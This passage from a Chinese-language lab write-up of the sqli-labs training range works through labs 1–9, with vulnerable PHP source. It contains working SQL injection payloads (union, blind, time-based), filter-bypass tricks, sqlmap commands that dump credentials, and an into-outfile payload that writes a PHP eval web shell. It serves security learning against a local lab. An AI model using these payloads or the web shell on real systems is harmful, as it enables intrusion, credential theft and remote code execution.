+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ cat /var/www/html/shell.php</span><br><span class="line">200517  8:47:04       10 Connect    root@localhost on security</span><br><span class="line">           10 Init DB    security</span><br><span class="line">           10 Query    SELECT * FROM users WHERE id=&#x27;1&#x27;;select &#x27;&lt;?php phpinfo();?&gt;&#x27;-- &#x27; LIMIT 0,1</span><br></pre></td></tr></table></figure>
+
+<p>需要条件：</p>
+<ol>
+<li>Web 的物理路径</li>
+<li>MySQL 可以读写 Web 目录</li>
+<li>Windows 成功率 高于 Linux</li>
+</ol>
+<h4 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h4><p>第一步：插入恶意数据<br>进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。</p>
+<p>第二步：引用恶意数据<br>开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// --- 1. 获取和转义用户输入 ---</span></span><br><span class="line">    </span><br><span class="line">    <span class="variable">$username</span>= <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$curr_pass</span>= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;current_password&#x27;</span>]);<span class="comment">#当前密码</span></span><br><span class="line">    <span class="variable">$pass</span>= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);<span class="comment">#新密码</span></span><br><span class="line">    <span class="variable">$re_pass</span>= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;re_password&#x27;</span>]);<span class="comment">#确认密码</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// --- 2. 构造并执行 SQL 更新语句 ---</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$pass</span>==<span class="variable">$re_pass</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$curr_pass</span>&#x27; &quot;</span>;<span class="comment">#在修改密码文件中却是直接调用username参数，并没有转义</span></span><br><span class="line">        </span><br><span class="line">        <span class="variable">$res</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;You tried to be smart, Try harder!!!! :( &#x27;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$row</span> = <span class="title function_ invoke__">mysql_affected_rows</span>();</span><br><span class="line">       </span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&#x27;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$row</span>==<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Password successfully updated&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: failed.php&#x27;</span>);</span><br><span class="line">            <span class="comment">//echo &#x27;You tried to be smart, Try harder!!!! :( &#x27;;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&lt;center&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Make sure New Password and Retype Password fields have same value&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;refresh:2, url=index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>如果注册一个名为admin’#的用户，那么</p>
+<p>这是原sql语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> users <span class="keyword">SET</span> PASSWORD<span class="operator">=</span><span class="string">&#x27;$pass&#x27;</span> <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;$username&#x27;</span> <span class="keyword">and</span> password<span class="operator">=</span><span class="string">&#x27;$curr_pass&#x27;</span> </span><br></pre></td></tr></table></figure>
+
+<p>若admin’#进行修改密码时，sql语句会变成</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE users SET PASSWORD=&#x27;123456&#x27; where username=&#x27;admin&#x27;#&#x27; and password=&#x27;$curr_pass&#x27; </span><br></pre></td></tr></table></figure>
+
+<h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><h5 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h5><ol>
+<li>注入点测试：同普通注入</li>
+<li>爆破数据库名称长度:<code>1&#39; and length(database())=20 --+</code></li>
+<li>爆破数据库名称:<code>1&#39; and ascii(substr(database(),1,1))=20 --+ </code></li>
+<li>爆破表的个数:<code>1&#39; and (select count(table_name) from information_schema.tables where table_schema=database()) =2--+</code></li>
+<li>爆破表名称长度:<code>1&#39; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1)) = 10--+</code></li>
+<li>爆破表名称:<code>1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=100--+     </code></li>
+<li>爆破列数:<code>1&#39; and (select count(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;)=8--+  </code></li>
+<li>爆破列名长度:<code>1&#39; and length(substr((select column_name from information_schema.columns where table_name= &#39;users&#39; limit 0,1),1))=2--+ </code></li>
+<li>爆破列名:<code>1&#39; and ascii(substr((select column_name from information_schema.columns where table_name = &#39;users&#39; limit 1,1),1,1))=100--+ </code></li>
+<li>爆破字段长度:<code>1&#39; and length(substr((select user from users limit 0,1),1))=10--+ </code></li>
+<li>爆破字段名:<code>1&#39; and ascii(substr((select user from users limit 0,1),1,1))=100--+ </code></li>
+</ol>
+<h5 id="延时盲注"><a href="#延时盲注" class="headerlink" title="延时盲注"></a>延时盲注</h5><ol>
+<li>注入点测试:<code>1&#39; and sleep(5) #</code>存在时间延时说明存在延时盲注</li>
+<li>其余流程和布尔盲注相同但是要用到<code>if(expr1,expr2,expr3)</code>函数(如果 expr1 是TRUE ，则 if()的返回值为expr2; 否则返回值则为 expr3)。比如如果要爆破数据库名长度则样这么注入<code>1&#39; and if(length(database())=1,sleep(5),1) </code>。</li>
+</ol>
+<h4 id="RCE-无回显"><a href="#RCE-无回显" class="headerlink" title="RCE-无回显"></a>RCE-无回显</h4><p>适用于既没有报错也没有回显的情况，因为前端界面无法输出有效信息</p>
+<h5 id="into-outfile"><a href="#into-outfile" class="headerlink" title="into outfile"></a>into outfile</h5><p>三个条件:</p>
+<ol>
+<li><p>具有file权限，默认只有root权限，对目录要有写权限</p>
+</li>
+<li><p>在数据库配置文件（my.ini）中，配置项含有：secure_file_priv&#x3D;’’（注意在数据库中此项默认为secure_file_priv&#x3D;null，secure_file_priv表示允许导入的路径），可以利用<code>show variables like &#39;secure_file_priv&#39;</code>查询</p>
+</li>
+<li><p>知道数据库的绝对路径（可以通过报错信息、phpinfo界面、404界面等一些方式知道）</p>
+</li>
+</ol>
+<p>shellcode :<code>http://localhost/Less-7/?id=-1&#39;)) union select 1,2,&quot;&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;&quot; into outfile &quot;F:/app/phpstudy_pro/WWW/sqli-labs-master/1.php&quot;--+</code>(cmd为蚁剑的连接密码;所导出的文件名一定要是网站中不存在的，不然也不会成功)</p>
+<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><p>过滤了 or 和 and 可以采用 双写或者 &amp;&amp; || 绕过</p>
+<p>过滤注释 可以使用闭合绕过</p>
+<p>过滤了空格 可以使用如下的符号来替代(也可以通过报错注入绕过空格)：</p>
+<table>
+<thead>
+<tr>
+<th>符号</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>%09</td>
+<td>TAB 键 (水平)</td>
+</tr>
+<tr>
+<td>%0a</td>
+<td>新建一行</td>
+</tr>
+<tr>
+<td>%0c</td>
+<td>新的一页</td>
+</tr>
+<tr>
+<td>%0d</td>
+<td>return 功能</td>
+</tr>
+<tr>
+<td>%0b</td>
+<td>TAB 键 (垂直)</td>
+</tr>
+<tr>
+<td>%a0</td>
+<td>空格</td>
+</tr>
+</tbody></table>
+<p>过滤了union和select可以用大小写混用绕过</p>
+<p>过滤了union select可以用union all select绕过</p>
+<p>转义了单引号如果是gbk编码的话可以通过%df%27绕过(宽字节注入)，也可以通过十六进制编码绕过(不使用单引号)</p>
+<blockquote>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251009163133720.png" alt="image-20251009163133720"></p>
+<p>MySQL 会尝试将整个字符串视为一个数字，遇到非数字字符就会停止转换。</p>
+</blockquote>
+<h3 id="HTTP参数污染"><a href="#HTTP参数污染" class="headerlink" title="HTTP参数污染"></a>HTTP参数污染</h3><p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251009143610794.png" alt="image-20251009143610794"></p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251009145027851.png" alt="image-20251009145027851"></p>
+<h2 id="URL构造"><a href="#URL构造" class="headerlink" title="URL构造"></a>URL构造</h2><h3 id="关于URL中的空格"><a href="#关于URL中的空格" class="headerlink" title="关于URL中的空格"></a>关于URL中的空格</h3><p>我们在浏览器地址栏输入网址时，会调用类似strip的函数去除首尾的空格,所以最末尾的空格必须用其它符号代替。</p>
+<p>由于历史遗留和两种编码规范的混用，空格在URL中有两种表现形式：</p>
+<ol>
+<li>通用 URI 编码（RFC 3986）：它规定空格应编码为 <code>%20</code>。它规定 <code>+</code> 号是一个 保留字符（通常不需编码，除非作为数据）。</li>
+<li>HTML 表单数据编码（<code>application/x-www-form-urlencoded</code>）：这是 HTML 表单提交数据（无论是 GET 的查询字符串还是 POST 的请求体）时使用的规范。这个规范专门规定空格应编码为 <strong><code>+</code></strong>，而 <strong><code>+</code></strong> 号本身如果作为数据内容，则必须编码为 <code>%2B</code>。</li>
+</ol>
+<p>为了避免混淆，建议遵循以下“部位”编码原则：</p>
+<ul>
+<li><p>URL 路径部分（<code>?</code> 问号之前的部分）：空格只能使用 <strong><code>%20</code></strong>。</p>
+</li>
+<li><p>URL 查询字符串部分（<code>?</code> 问号之后的部分）：空格 建议使用 <strong><code>+</code></strong>，因为它符合 <code>x-www-form-urlencoded</code> 的标准，且广泛被服务器接受并正确解析为空格。</p>
+</li>
+<li><p>POST 请求体：</p>
+<ul>
+<li><p>如果 <code>Content-Type</code> 是 <code>application/x-www-form-urlencoded</code>，则空格使用 <code>+</code>。</p>
+</li>
+<li><p>如果 <code>Content-Type</code> 是 <code>application/json</code> 或其他非表单格式，则请求体中的数据（如果需要 URL 编码）使用 <code>%20</code>。</p>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="关于URL中的"><a href="#关于URL中的" class="headerlink" title="关于URL中的#"></a>关于URL中的#</h3><p>用%23代替。</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/461992078">https://zhuanlan.zhihu.com/p/461992078</a></p>
+<h3 id="补充：添加MySQL日志"><a href="#补充：添加MySQL日志" class="headerlink" title="补充：添加MySQL日志"></a>补充：添加MySQL日志</h3><p>修改my.ini并添加</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">general_log</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">general_log_file</span>=/path/to/your/general.log</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20250929154352407.png" alt="image-20250929154352407"></p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20250929154453702.png" alt="image-20250929154453702"></p>
+<p>成功显示日志</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20250929154513747.png" alt="image-20250929154513747"></p>
+<h2 id="lab1-单引号封闭的字符型注入"><a href="#lab1-单引号封闭的字符型注入" class="headerlink" title="lab1-单引号封闭的字符型注入"></a>lab1-单引号封闭的字符型注入</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://169.254.58.242/Less-1/?id=1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20250929142914221.png" alt="image-20250929142914221"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://169.254.58.242/Less-1/?id=1&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20250929143018664.png" alt="image-20250929143018664"></p>
+<p>由此可以推断出大致的SQL语句为<code>SELECT * FROM table_name WHERE column_name = &#39;1&#39; LIMIT 0,1</code>。</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20250930143737686.png" alt="image-20250930143737686"></p>
+<p>当前表行数为3</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20250930150943482.png" alt="image-20250930150943482"></p>
+<p>表中的3个列都有回显</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20250930151154675.png" alt="image-20250930151154675"></p>
+<p>数据库名称是security</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20250930151444113.png" alt="image-20250930151444113"></p>
+<p>security库中有emails,referers,uagents,users这几张表</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20250930151638360.png" alt="image-20250930151638360"></p>
+<p>users表里面有id,username,password这几个字段</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20250930151903154.png" alt="image-20250930151903154"></p>
+<p>查到所有账户的账号密码</p>
+<h2 id="lab2-数字型注入"><a href="#lab2-数字型注入" class="headerlink" title="lab2-数字型注入"></a>lab2-数字型注入</h2><p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20250930152131598.png" alt="image-20250930152131598"></p>
+<p>存在注入点</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20250930152328453.png" alt="image-20250930152328453"></p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20250930152345031.png" alt="image-20250930152345031"></p>
+<p>说明是数字型注入点</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20250930155429923.png" alt="image-20250930155429923"></p>
+<p>当前表有3列</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20250930155502840.png" alt="image-20250930155502840"></p>
+<p>3列均有回显</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20250930155548874.png" alt="image-20250930155548874"></p>
+<p>数据库名为security</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20250930155709881.png" alt="image-20250930155709881"></p>
+<p>数据表有emails,referers,uagents,users</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20250930155807987.png" alt="image-20250930155807987"></p>
+<p>列有id,username,password</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20250930155909499.png" alt="image-20250930155909499"></p>
+<p>SQL注入成功</p>
+<h2 id="lab3-括号与单引号封闭的注入"><a href="#lab3-括号与单引号封闭的注入" class="headerlink" title="lab3-括号与单引号封闭的注入"></a>lab3-括号与单引号封闭的注入</h2><p> <img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251002145450100.png" alt="image-20251002145450100"></p>
+<p>存在注入点，根据返回结果可以推测出sql语句大致为<code>select * from table where id=(&#39;x&#39;) LIMIT 0,1</code></p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251002150048027.png" alt="image-20251002150048027"></p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251002150218655.png" alt="image-20251002150218655"></p>
+<p>数据库名称security</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251002150342234.png" alt="image-20251002150342234"></p>
+<p>发现数据表emails,referers,uagents,users</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251002150430369.png" alt="image-20251002150430369"></p>
+<p>发现字段</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251002150526542.png" alt="image-20251002150526542"><br>发现账号密码</p>
+<h2 id="lab4-双引号与括号封闭的字符型注入"><a href="#lab4-双引号与括号封闭的字符型注入" class="headerlink" title="lab4-双引号与括号封闭的字符型注入"></a>lab4-双引号与括号封闭的字符型注入</h2><p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251002150738292.png" alt="image-20251002150738292"></p>
+<p>存在注入点，根据返回结果可以推测出sql语句大致为<code>select * from table where id=(&quot;x&quot;) LIMIT 0,1</code></p>
+<p>其余与lab3相同</p>
+<h2 id="lab5-报错注入"><a href="#lab5-报错注入" class="headerlink" title="lab5-报错注入"></a>lab5-报错注入</h2><p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251002152800855.png" alt="image-20251002152800855"></p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251002152818649.png" alt="image-20251002152818649"></p>
+<p>存在注入点，但是由于没有回显要使用报错注入</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251002152912591.png" alt="image-20251002152912591"></p>
+<p>有3列有回显</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251002153858110.png" alt="image-20251002153858110"></p>
+<p>数据库名security</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251002155006108.png" alt="image-20251002155006108"></p>
+<p>数据表emails,referers,uagents,users</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251002155117399.png" alt="image-20251002155117399"></p>
+<p>字段id,username,password</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251002161150193.png" alt="image-20251002161150193"></p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251002161200323.png" alt="image-20251002161200323"></p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251002161211212.png" alt="image-20251002161211212"></p>
+<p>可以查找到所有账号密码</p>
+<h2 id="lab6-双引号闭合的报错注入"><a href="#lab6-双引号闭合的报错注入" class="headerlink" title="lab6-双引号闭合的报错注入"></a>lab6-双引号闭合的报错注入</h2><p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251002161432573.png" alt="image-20251002161432573"></p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251002161401613.png" alt="image-20251002161401613"></p>
+<p>存在注入点并且可以判断出双引号闭合的报错注入</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251002161515802.png" alt="image-20251002161515802"></p>
+<p>其余步骤与lab5相同</p>
+<h2 id="lab7-单引号与双括号闭合的字符型注入"><a href="#lab7-单引号与双括号闭合的字符型注入" class="headerlink" title="lab7-单引号与双括号闭合的字符型注入"></a>lab7-单引号与双括号闭合的字符型注入</h2><blockquote>
+<p>数据库中配置中要有<code>secure_file_priv=&#39;&#39;</code>，否则实验不会成功</p>
+</blockquote>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251002161623926.png" alt="image-20251002161623926"></p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251002162646911.png" alt="image-20251002162646911"></p>
+<p>存在注入点，但是既没有回显也没有报错，所以考虑通过注入写shell的方式进行注入</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251002194431806.png" alt="image-20251002194431806"></p>
+<p>推断sql语句为<code>select * from table where id=((&#39;x&#39;)) LIMIT 0,1</code></p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251002195833320.png" alt="image-20251002195833320"></p>
+<p>有三列回显</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251002205633421.png" alt="image-20251002205633421"></p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251002205649106.png" alt="image-20251002205649106"></p>
+<p>成功注入shellcode</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251002205618835.png" alt="image-20251002205618835"></p>
+<p>成功获取RCE</p>
+<h2 id="lab8-盲注"><a href="#lab8-盲注" class="headerlink" title="lab8-盲注"></a>lab8-盲注</h2><h3 id="手工注入-1"><a href="#手工注入-1" class="headerlink" title="手工注入"></a>手工注入</h3><p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251002210028062.png" alt="image-20251002210028062"></p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251002210041459.png" alt="image-20251002210041459"></p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251002210236130.png" alt="image-20251002210236130"></p>
+<p>存在注入点，单引号闭合且可以尝试用布尔盲注</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251002210308162.png" alt="image-20251002210308162"></p>
+<p>3列有回显</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251002210640869.png" alt="image-20251002210640869"></p>
+<p>数据库名称长度为8</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251003154512715.png" alt="image-20251003154512715"></p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251003155037330.png" alt="image-20251003155037330"></p>
+<p>爆破库名，库民为security</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251003160027628.png" alt="image-20251003160027628"></p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251003160041644.png" alt="image-20251003160041644"></p>
+<p>爆破数据表个数，有4个</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251003160447143.png" alt="image-20251003160447143"></p>
+<p>爆破表名长度：分别是6、8、7、5</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251003175242955.png" alt="image-20251003175242955"></p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251003175251618.png" alt="image-20251003175251618"></p>
+<p>获得表名emails,referers,uagents,users</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251003175538051.png" alt="image-20251003175538051"></p>
+<p>users表里面有3列</p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251003180718169.png" alt="image-20251003180718169"></p>
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251003180642249.png" alt="image-20251003180642249"></p>
+<p>users里面有字段id,username,password</p>
+<h3 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://localhost/Less-8/?<span class="built_in">id</span>=1 --batch</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251005105514882.png" alt="image-20251005105514882"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://localhost/Less-8/?id=1=???&quot;</span> --current-db --batch</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251005110705652.png" alt="image-20251005110705652"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://localhost/Less-8/?id=1&quot;</span> -D security --tables --batch</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251005110753250.png" alt="image-20251005110753250"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://localhost/Less-8/?id=1&quot;</span> -D security -T <span class="built_in">users</span> --columns --batch</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251005110839893.png" alt="image-20251005110839893"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://localhost/Less-8/?id=1&quot;</span> -D security -T <span class="built_in">users</span> --C username,password --dump --batch</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251005110915382.png" alt="image-20251005110915382"></p>
+<h2 id="lab9-延迟盲注"><a href="#lab9-延迟盲注" class="headerlink" title="lab9-延迟盲注"></a>lab9-延迟盲注</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://localhost/Less-9/?<span class="built_in">id</span>=1 --current database --batch</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251005111605565.png" alt="image-20251005111605565"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://localhost/Less-9/?<span class="built_in">id</span>=1 --current-db --batch</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251005111653484.png" alt="image-20251005111653484"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://localhost/Less-9/?<span class="built_in">id</span>=1 -D security --tables --batch</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/09/23/sql-libs%E9%9D%B6%E5%9C%BA/image-20251005111733598.png" alt="image-20251005111733598"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://localhost/Less-9/?<span class="built_in">id</span>=1 -D security -T <span class="built_in">users</span> --batch</span><br></pre></td></tr></table></figure>
+
